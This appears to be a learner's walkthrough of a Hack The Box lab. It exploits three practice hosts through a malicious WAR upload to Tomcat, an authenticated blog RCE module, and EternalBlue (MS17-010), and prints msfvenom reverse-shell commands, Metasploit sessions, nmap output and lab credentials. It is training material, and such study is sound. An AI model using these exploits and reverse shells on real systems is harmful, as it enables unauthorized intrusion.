### HTB Pentester Path <br>
### Shells & Payloads - The Live Engagement Lab <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>
<br>

Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.

### Scenario:

CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

### Objectives:

- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

Complete the objectives by answering the challenge questions below.

### Credentials and Other Needed Info:

Foothold:

- IP: 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD)
- Credentials: `htb-student` / HTB_@cademy_stdnt! Can be used by RDP.



### Foothold Connection Instructions:  
Accessing the Skills Assessment lab environment will require the use of [XfreeRDP](https://manpages.ubuntu.com/manpages/trusty/man1/xfreerdp.1.html) to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy `VPN key` or the `Pwnbox` built into the module section. You can start the `FreeRDP` client on the Pwnbox by typing the following into your shell once the target spawns:

    xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!

---

`Host-1 hint`:
This host has two upload vulnerabilities. If you look at status.inlanefreight.local or browse to the IP on port 8080, you will see the vector. When messing with one of them, the creds " tomcat | Tomcatadm " may come in handy.

`Host-2 hint`:
Have you taken the time to validate the scan results? Did you browse to the webpage being hosted? blog.inlanefreight.local looks like a nice space for team members to chat. If you need the credentials for the blog, " admin:admin123!@# " have been given out to all members to edit their posts. At least, that's what our recon showed.

`Host-3 hint`:
This host is vulnerable to a very common exploit released in 2017. It has been known to make many a sysadmin feel Blue.

---

### IPs:

foothold:    10.129.175.32 / 10.129.204.126 <br>
Host-01:     172.16.1.11:8080 <br>
Host-02:     172.16.1.12 blog.inlanefreight.local <br>
Host-03:     172.16.1.13 <br>

    xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt! /size:1920x1080

foothold `/etc/hosts`:

    172.16.1.11  status.inlanefreight.local
    172.16.1.12  blog.inlanefreight.local
    10.129.201.134  lab.inlanefreight.local
    
---
---
---

### Question 1:
What is the hostname of Host-1? (Format: all lower case)

let's rdp into the foothold host:

	xfreerdp /v:10.129.175.32 /u:htb-student /p:HTB_@cademy_stdnt! /size:1920x1080

Ran a quickie nmap to see whats running on the host:

	 $sudo nmap -sT -sC -sV -A -F 172.16.1.11
	 
	[sudo] password for htb-student: 
	Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-25 19:19 EDT
	Nmap scan report for status.inlanefreight.local (172.16.1.11)
	Host is up (0.0011s latency).
	Not shown: 93 closed tcp ports (conn-refused)
	PORT     STATE SERVICE       VERSION
	80/tcp   open  http          Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: Inlanefreight Server Status
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
	515/tcp  open  printer       Microsoft lpd
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2025-09-25T23:20:27+00:00; +1s from scanner time.
	| ssl-cert: Subject: commonName=shells-winsvr
	| Not valid before: 2025-09-24T23:09:00
	|_Not valid after:  2026-03-26T23:09:00
	| rdp-ntlm-info: 
	|   Target_Name: SHELLS-WINSVR
	|   NetBIOS_Domain_Name: SHELLS-WINSVR
	|   NetBIOS_Computer_Name: SHELLS-WINSVR
	|   DNS_Domain_Name: shells-winsvr
	|   DNS_Computer_Name: shells-winsvr
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-09-25T23:20:22+00:00
	8080/tcp open  http          Apache Tomcat 10.0.11
	|_http-open-proxy: Proxy might be redirecting requests
	|_http-favicon: Apache Tomcat
	|_http-title: Apache Tomcat/10.0.11
	MAC Address: 00:50:56:B0:EF:52 (VMware)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.92%E=4%D=9/25%OT=80%CT=7%CU=43190%PV=Y%DS=1%DC=D%G=Y%M=005056%T
	OS:M=68D5CE3A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I
	OS:%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M
	OS:5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70
	OS:)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
	OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
	OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
	OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
	OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
	OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
	OS:%T=80%CD=Z)
	
	Network Distance: 1 hop
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
	|   Computer name: shells-winsvr
	|   NetBIOS computer name: SHELLS-WINSVR\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-25T16:20:22-07:00
	| smb2-time: 
	|   date: 2025-09-25T23:20:22
	|_  start_date: N/A
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   3.1.1: 
	|_    Message signing enabled but not required
	|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:ef:52 (VMware)

&#x1F6A9; found **SHELLS-W--edit--NSVR** for computer name.


---

### Question 2:
Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

Looked at the site hosted on port 8080. Its running a vulnerable version of apache tomcat.
Let's try those creds we found on the desktop: ` tomcat / Tomcatadm`. 

Poked around the mgmt portal and found and upload for java .WAR files.
We can craft a payload with msfvenom, using 443 to lend in:

	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war -o windowsxp.war
	
	Payload size: 1095 bytes
	Final size of war file: 1095 bytes
	Saved as: windowsxp.war

Now lets stand up a listener, a quick `ip a` shows us that out of a few interfaces that are up, `172.16.1.5` is our int exposed to the internal network. So we'll use that to catch a shell with MSF:

	$msfconsole
	
	[msf](Jobs:0 Agents:0) >> search multi/handler
	
	Matching Modules
	================
	
	   #  Name                                                 Disclosure Date  Rank       Check  Description
	   -  ----                                                 ---------------  ----       -----  -----------
	   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
	   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
	   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
	   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
	   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
	   5  exploit/multi/handler    
	
	[msf](Jobs:0 Agents:0) >> use 5
	[*] Using configured payload generic/shell_reverse_tcp
	[msf](Jobs:0 Agents:0) exploit(multi/handler) >> show options
	
	Module options (exploit/multi/handler):
	
	   Name  Current Setting  Required  Description
	   ----  ---------------  --------  -----------
	
	
	Payload options (generic/shell_reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST                   yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Wildcard Target
	
	
	[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 172.16.1.5
	lhost => 172.16.1.5
	[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 443
	lport => 443
	[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
	
	[*] Started reverse TCP handler on 172.16.1.5:443 


Now upload and execute the .war file by navigating to it's path:

	http://172.16.1.11:8080/windowsxp/

Now back on MSF:

	[*] Command shell session 1 opened (172.16.1.5:443 -> 172.16.1.11:49954) at 2025-09-25 21:23:37 -0400

Here we dropped into a shell:

	C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>cd C:\Shares
	cd C:\Shares
	
	C:\Shares>DIR
	DIR
	 Volume in drive C has no label.
	 Volume Serial Number is 2683-3D37
	
	 Directory of C:\Shares
	
	09/22/2021  01:22 PM    <DIR>          .
	09/22/2021  01:22 PM    <DIR>          ..
	09/22/2021  01:24 PM    <DIR>          dev-share
	               0 File(s)              0 bytes
	               3 Dir(s)  26,685,648,896 bytes free


&#x1F6A9; found **dev--edit--**.


---

### Question 3:
What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

lets see if we get a banner on an http nmap:

	$sudo nmap -A -v -sT -sC -sV -O -p80 172.16.1.12
	[sudo] password for htb-student: 

	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Inlanefreight Gabber
	| http-robots.txt: 1 disallowed entry 
	|_/
	|_http-favicon: Unknown favicon MD5: 7E765F1C4CB20568118ED55C0B6FFA91
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	MAC Address: 00:50:56:B0:FC:26 (VMware)

&#x1F6A9; found **ubuntu**.

---

### TTP Question 4:
What language is the shell written in that gets uploaded when using the 50064.rb exploit?

logged into http://blog.inlanefreight.local/ with the creds given in the Administrator foothold account: admin:admin123!@#

Once logged in, the first internal post shows Slade finding a vulnerability for rce in PHP, so we're gonna try that on a hunch.

&#x1F6A9; found **ph--edit--**.


--- 

### Question 5:
Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt

Started with an nmap:

	$sudo nmap -A -F -O -v -sV -sC 172.16.1.12

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
	|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
	|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	| http-robots.txt: 1 disallowed entry 
	|_/
	|_http-title: Inlanefreight Gabber
	|_http-favicon: Unknown favicon MD5: 7E765F1C4CB20568118ED55C0B6FFA91
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	MAC Address: 00:50:56:B0:96:70 (VMware)
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.6
	Uptime guess: 28.663 days (since Thu Aug 28 22:08:24 2025)
	Network Distance: 1 hop
	TCP Sequence Prediction: Difficulty=262 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Only see 22 and 80 open with a fast scan, so lets play with the blog.
First I'm gonna move that ruby/php exploit we found on exploitdb (from the idiot's blog post) from my desktop to my msf module folder:

	┌─[✗]─[htb-student@skills-foothold]─[~/Desktop]
	└──╼ $sudo mv 50064.rb /usr/share/metasploit-framework/modules/exploits/50064.rb
	[sudo] password for htb-student: 

then start MSF and reload all the modules:

	$ msfconsole
	$ reload_all

Now lets find/load the 50064 exploit in msf, and set the appropriate options:

	msf6 > search 50064
	
	Matching Modules
	================
	
	   #  Name           Disclosure Date  Rank       Check  Description
	   -  ----           ---------------  ----       -----  -----------
	   0  exploit/50064  2018-12-19       excellent  No     Lightweight facebook-styled blog authenticated remote code execution
	
	
	Interact with a module by name or index. For example info 0, use 0 or use exploit/50064
	
	msf6 > use 0
	[*] Using configured payload php/meterpreter/bind_tcp
	msf6 exploit(50064) > show options
	
	Module options (exploit/50064):
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   PASSWORD   demo             yes       Blog password
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:
	                                         <path>'
	   RPORT      80               yes       The target port (TCP)
	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
	   TARGETURI  /                yes       The URI of the arkei gate
	   USERNAME   demo             yes       Blog username
	   VHOST                       no        HTTP server virtual host
	
	
	Payload options (php/meterpreter/bind_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LPORT  4444             yes       The listen port
	   RHOST                   no        The target address
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   PHP payload
	
	
	msf6 exploit(50064) > set password admin123!@#
	password => admin123!@#
	msf6 exploit(50064) > set username admin
	username => admin
	msf6 exploit(50064) > set rhost 172.16.1.12
	rhost => 172.16.1.12
	msf6 exploit(50064) > show options 
	
	Module options (exploit/50064):
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   PASSWORD   admin123!@#      yes       Blog password
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	   RHOSTS     172.16.1.12      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:
	                                         <path>'
	   RPORT      80               yes       The target port (TCP)
	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
	   TARGETURI  /                yes       The URI of the arkei gate
	   USERNAME   admin            yes       Blog username
	   VHOST                       no        HTTP server virtual host
	
	
	Payload options (php/meterpreter/bind_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LPORT  4444             yes       The listen port
	   RHOST  172.16.1.12      no        The target address
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   PHP payload
	
	
	msf6 exploit(50064) > set vhost blog.inlanefreight.local
	vhost => blog.inlanefreight.local

Run it:

	msf6 exploit(50064) > exploit
	
	[*] Got CSRF token: dda2585d0e
	[*] Logging into the blog...
	[+] Successfully logged in with admin
	[*] Uploading shell...
	[+] Shell uploaded as data/i/4p54.php
	[+] Payload successfully triggered !
	[*] Started bind TCP handler against 172.16.1.12:4444
	[*] Sending stage (39282 bytes) to 172.16.1.12
	[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2025-09-26 14:50:20 -0400
	
	meterpreter > 

	Now just pop a shell and cat the flag file:
	
	meterpreter > shell
	Process 4003 created.
	Channel 0 created.
	whoami
	www-data
	pwd         
	/var/www/blog.inlanefreight.local/data/i
	cat /customscripts/flag.txt
	B1nD_Shells_r_cool

&#x1F6A9; found **B1nD_S--edit--ls_r_cool**.

---

### Question 6:
What is the hostname of Host-3?

Started with an nmap:

	$sudo nmap -A -F -sC -sV -O 172.16.1.13
	[sudo] password for htb-student: 
	Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-26 15:03 EDT

	PORT    STATE SERVICE      VERSION
	80/tcp  open  http         Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: 172.16.1.13 - /
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
	MAC Address: 00:50:56:B0:E8:3A (VMware)
	Device type: general purpose
	Running: Microsoft Windows 2016
	OS CPE: cpe:/o:microsoft:windows_server_2016
	OS details: Microsoft Windows Server 2016 build 10586 - 14393
	Network Distance: 1 hop
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
	| smb2-time: 
	|   date: 2025-09-26T19:03:32
	|_  start_date: 2025-09-26T17:30:28
	|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:e8:3a (VMware)
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: SHELLS-WINBLUE
	|   NetBIOS computer name: SHELLS-WINBLUE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-26T12:03:32-07:00
	| smb2-security-mode: 
	|   3.1.1: 
	|_    Message signing enabled but not required

&#x1F6A9; found **SHELLS-WIN--edit--BLUE**.

---
### Question 7:
Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

Between the hint, the hostname and the box running Windows Server 2016, I'd venture to guess this box is vulnerable to Eternal Blue. Let

	msf6 > search eternalblue
	
	Matching Modules
	================
	
	   #  Name                                      Disclosure Date  Rank     Check  Description
	   -  ----                                      ---------------  ----     -----  -----------
	   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
	   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
	   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
	   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
	   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
	
	
	Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
	
	msf6 > use 1

Lets set the options for the Eternal psexec smb RCE exploit:

	msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 172.16.1.13
	rhost => 172.16.1.13
	msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 172.16.1.5
	lhost => 172.16.1.5
	msf6 exploit(windows/smb/ms17_010_psexec) > exploit
	
	[*] Started reverse TCP handler on 172.16.1.5:4444 
	[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
	[*] 172.16.1.13:445 - Built a write-what-where primitive...
	[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
	[*] 172.16.1.13:445 - Selecting PowerShell target
	[*] 172.16.1.13:445 - Executing the payload...
	[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
	\[*] Sending stage (175174 bytes) to 172.16.1.13
	[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2025-09-26 15:27:28 -0400

Go-go gadget traversal:

	meterpreter > pwd
	C:\Windows\system32
	meterpreter > cd ..
	meterpreter > pwd
	C:\
	meterpreter > cd Users
	meterpreter > ls
	Listing: C:\Users
	=================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	40777/rwxrwxrwx   8192  dir   2020-10-05 21:51:19 -0400  .NET v2.0
	40777/rwxrwxrwx   8192  dir   2020-10-05 21:51:19 -0400  .NET v2.0 Classic
	40777/rwxrwxrwx   8192  dir   2020-10-05 21:51:25 -0400  .NET v4.5
	40777/rwxrwxrwx   8192  dir   2020-10-05 21:51:24 -0400  .NET v4.5 Classic
	40777/rwxrwxrwx   8192  dir   2020-10-05 19:18:23 -0400  Administrator
	40777/rwxrwxrwx   0     dir   2016-07-16 09:34:35 -0400  All Users
	40777/rwxrwxrwx   8192  dir   2020-10-05 21:51:18 -0400  Classic .NET AppPool
	40555/r-xr-xr-x   0     dir   2016-07-16 02:04:24 -0400  Default
	40777/rwxrwxrwx   0     dir   2016-07-16 09:34:35 -0400  Default User
	40555/r-xr-xr-x   4096  dir   2016-07-16 09:23:21 -0400  Public
	100666/rw-rw-rw-  174   fil   2016-07-16 09:23:24 -0400  desktop.ini
	
	meterpreter > cd Administrator
	meterpreter > ls
	Listing: C:\Users\Administrator
	===============================
	
	Mode              Size    Type  Last modified              Name
	----              ----    ----  -------------              ----
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  AppData
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Application Data
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:25 -0400  Contacts
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Cookies
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Desktop
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Documents
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Downloads
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Favorites
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Links
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Local Settings
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Music
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  My Documents
	100666/rw-rw-rw-  786432  fil   2020-10-05 19:18:23 -0400  NTUSER.DAT
	100666/rw-rw-rw-  65536   fil   2020-10-05 19:18:23 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf
	100666/rw-rw-rw-  524288  fil   2020-10-05 19:18:23 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer0000000000000000000
	                                                           1.regtrans-ms
	100666/rw-rw-rw-  524288  fil   2020-10-05 19:18:23 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer0000000000000000000
	                                                           2.regtrans-ms
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  NetHood
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Pictures
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  PrintHood
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Recent
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Saved Games
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:25 -0400  Searches
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  SendTo
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Start Menu
	40777/rwxrwxrwx   0       dir   2020-10-05 19:18:23 -0400  Templates
	40555/r-xr-xr-x   0       dir   2020-10-05 19:18:23 -0400  Videos
	100666/rw-rw-rw-  0       fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG1
	100666/rw-rw-rw-  24576   fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG2
	100666/rw-rw-rw-  20      fil   2020-10-05 19:18:23 -0400  ntuser.ini
	
	meterpreter > cd Desktop
	meterpreter > ls
	Listing: C:\Users\Administrator\Desktop
	=======================================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100666/rw-rw-rw-  14    fil   2021-10-18 15:26:10 -0400  Skills-flag.txt
	100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini

cat it out:
  
	meterpreter > cat Skills-flag.txt

&#x1F6A9; found **One-H0--edit--st-Down!**
